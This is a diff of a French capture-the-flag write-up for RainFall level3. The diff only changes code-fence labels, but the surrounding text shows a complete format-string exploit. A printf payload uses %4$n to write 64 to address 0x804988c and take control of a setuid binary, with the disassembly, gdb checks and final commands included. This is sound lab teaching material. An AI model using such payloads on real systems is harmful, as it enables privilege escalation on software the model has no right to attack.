@@ -1,11 +1,11 @@
 On a un binaire avec le flag setuid
-```
+```sh
 level3@RainFall:~$ ls -l
 total 8
 -rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
 ```
 On désassemble
-```asm
+```sh
 level3@RainFall:~$ objdump -d -M intel ./level3
 080484a4 <v>:
  80484a4:       55                      push   ebp
@@ -85,7 +85,7 @@ Si on le passe, **fwrite** est appelé, on suppose que fwrite va écrire dans un
 ```
 Il faut donc écrire 64 à cette adresse **0x804988c** pour passer le contrôle.
 Vérifions d'abord la vulnérabilité de printf
-```
+```sh
 level3@RainFall:~$ ./level3
 aaaa %x %x %x %x %x %x %x
 aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
@@ -100,7 +100,7 @@ plusieurs choses:
 >Le format %n permet d'écrire à l'adresse n, qui est l'adresse d'un int, le nombre de charactère déjà imprimés par printf
 
 essayons d'écrire l'adresse en **little endian**:
-```
+```sh
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08%4$x"' > /tmp/test_payload
 level3@RainFall:~$ cat /tmp/test_payload | ./level3
 �804988c
@@ -111,11 +111,11 @@ l'adresse où le cmp s'effectue + une chaine random pour compléter + le format 
 **0x804988c** + a * 60 + %4$n
 soit:
 1 octet imprimé + 60 octets imprimés + 3 octets imprimés:
-```
+```sh
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%4$n"' > /tmp/payload
 ```
 Testons avec **gdb**:
-```
+```sh
 level3@RainFall:~$ gdb -q ./level3
 Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
 (gdb) b main
@@ -166,7 +166,7 @@ Wait what?!
 ```
 on a bien 64 dans **eax** donc le compte est bon
 Exploit:
-```
+```sh
 level3@RainFall:~$ cat /tmp/payload - | ./level3
 �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Wait what?!
